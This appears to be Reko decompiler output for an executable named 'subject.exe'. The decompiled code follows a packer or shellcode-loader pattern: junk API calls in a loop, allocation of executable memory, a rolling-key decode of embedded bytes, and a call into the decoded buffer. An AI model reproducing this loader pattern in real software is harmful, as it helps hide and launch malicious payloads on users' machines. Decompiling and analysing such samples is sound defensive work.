// subject.c
// Generated by decompiling subject.exe
// using Reko decompiler version VERSION

#include "subject.h"

// 0040228E: Register Eq_2 Win32CrtStartup()
DWORD Win32CrtStartup()
{
	return fn00402297(dwLoc04);
}

// 00402297: Register word32 fn00402297(Stack word32 dwArg00)
word32 fn00402297(word32 dwArg00)
{
	int32 esi_2 = 0x00;
	do
	{
		ui32 edx_20 = (GetProcessTimes(null, (struct _FILETIME *) 0x09, (struct _FILETIME *) 0x07, (struct _FILETIME *) 0x17, (struct _FILETIME *) 0x08) | 0xFF) & 0xEC;
		esi_2 = esi_2 + edx_20;
		Eq_11 eax_36 = MapViewOfFileEx(null, 8771135, 0x07, 0x00FFF7FC, 0x00522B33, 0x15);
		byte bl_39 = (byte) edx_20;
	} while (esi_2 < 138331879 && eax_36 == 0x00);
	Eq_11 eax_58 = VirtualAlloc(0x00, 81872, 0x3000, 0x40);
	Eq_11 edi_64 = eax_58;
	byte * esi_65 = dwArg00 + 0x0107;
	word32 ecx_129 = 0x01E2;
	uint32 edx_117 = 2434824443;
	byte dl_118 = ~0x04;
	word32 ebp_120 = 0x00;
	do
	{
		byte bh_85 = dl_118 + *esi_65;
		*edi_64 = bh_85;
		*edi_64 = (word32) *edi_64 + bl_39;
		edx_117 = edx_117 >> 0x08;
		word32 ebp_119 = ebp_120 + 0x0009058B;
		esi_65 = esi_65 + 0x01;
		edi_64 = edi_64 + 0x01;
		dl_118 = (byte) edx_117;
		ebp_120 = ebp_119 - 0x0009058A;
		if (ebp_119 - 0x0009058A == MapViewOfFileEx(null, 0x17, 0x1D, 0x13, 0x1B, 0x09) + 0x04)
		{
			edx_117 = 2434824443;
			dl_118 = ~0x04;
			ebp_120 = 0x00;
		}
		ecx_129 = ecx_161 - 0x01;
		word32 ecx_161 = ecx_129;
	} while (ecx_161 != 0x01);
	word32 esp_137;
	word32 esi_138;
	word32 eax_139;
	word32 edx_140;
	byte SZO_141;
	bool C_142;
	byte SCZO_143;
	word32 ebx_144;
	byte SO_145;
	bool Z_146;
	word32 ecx_147;
	word32 edi_148;
	word32 ebp_149;
	byte bh_150;
	byte dl_151;
	byte bl_152;
	(eax_58 + 0x04)();
	return eax_139;
}

